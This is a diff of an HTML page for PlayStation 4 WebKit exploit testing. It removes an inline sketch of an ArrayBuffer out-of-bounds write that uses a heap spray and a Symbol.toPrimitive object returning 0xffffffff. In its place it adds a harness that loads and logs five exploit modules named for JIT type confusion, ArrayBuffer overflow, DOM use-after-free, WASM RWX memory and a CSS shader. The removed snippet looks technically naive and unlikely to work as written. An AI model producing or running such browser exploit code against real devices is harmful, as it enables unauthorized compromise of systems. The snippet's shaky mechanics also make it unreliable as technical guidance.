@@ -1,30 +1,46 @@
 <!DOCTYPE html>
-<script src="spray.js"></script>
-<script>
-// Target ArrayBuffer to overflow
-let targetBuf = new ArrayBuffer(0x1000);
-let targetView = new Uint32Array(targetBuf);
+<html>
+<head>
+    <title>PS4 WebKit Tests</title>
+    <style>
+        body { font-family: monospace; background: #111; color: #0f0; }
+        #log { white-space: pre; margin: 20px; }
+    </style>
+</head>
+<body>
+    <h1>PS4 WebKit Exploit Tests</h1>
+    <div id="log"></div>
 
-// Craft malicious object to bypass bounds checks
-const evil = {
-  [Symbol.toPrimitive]() {
-    // Corrupt ArrayBuffer bounds (retail PS4 may allow this)
-    return 0xffffffff; // Force OOB write
-  }
-};
+    <script src="/lib/utils.js"></script>
+    <script src="/lib/spray.js"></script>
+    
+    <!-- Load exploits dynamically -->
+    <script>
+        const exploits = [
+            '/exploits/jit-confusion.js',
+            '/exploits/arraybuffer-oob.js',
+            '/exploits/dom-uaf.js',
+            '/exploits/wasm-rwx.js',
+            '/exploits/css-shader.js'
+        ];
 
-// Trigger overflow
-function triggerOverflow() {
-  heapSpray(); // Fragment memory
-  try {
-    // Attempt OOB write (type confusion)
-    targetView[evil] = 0xcafebabe;
-    // Check if corruption succeeded
-    if (targetView.length > 0x1000 / 4) {
-      return true;
-    }
-  } catch (e) {
-    return false;
-  }
-}
-</script>
+        async function runTests() {
+            log("Starting tests...\n");
+            
+            for (const url of exploits) {
+                try {
+                    await import(url).then(module => {
+                        log(`[+] ${module.testName}: ${module.runTest()}`);
+                    });
+                } catch (e) {
+                    log(`[-] Failed to load: ${url}`);
+                }
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between tests
+            }
+        }
+
+        // Start after DOM loads
+        window.onload = runTests;
+    </script>
+</body>
+</html>
